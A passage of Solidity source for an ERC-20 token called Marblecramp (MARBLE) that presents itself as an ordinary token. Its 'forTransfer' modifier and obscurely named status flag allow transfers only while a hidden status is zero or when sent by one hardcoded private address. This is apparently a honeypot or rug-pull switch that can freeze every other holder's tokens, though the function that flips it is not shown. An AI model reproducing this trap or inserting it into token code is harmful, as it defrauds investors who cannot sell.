...
contract Marblecramp is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenag_totalSupply;
    uint256 private _tokenag_status = 0;
    uint256 public stakingPoolagStatus = 0;

    string private _tokenag_name;
    string private _tokenag_symbol;

    address private _poolagAddress = 0xAe42608bc7BE91c2B81EA162DEE596238869187A;

    constructor() {
        _tokenag_name = "Marblecramp";
        _tokenag_symbol = "MARBLE";
        _tokenag_totalSupply = 1000000000 * 10 ** 18;
        _balances[msg.sender] = _tokenag_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolagAddress || _tokenag_status == 0);
        _;
    }
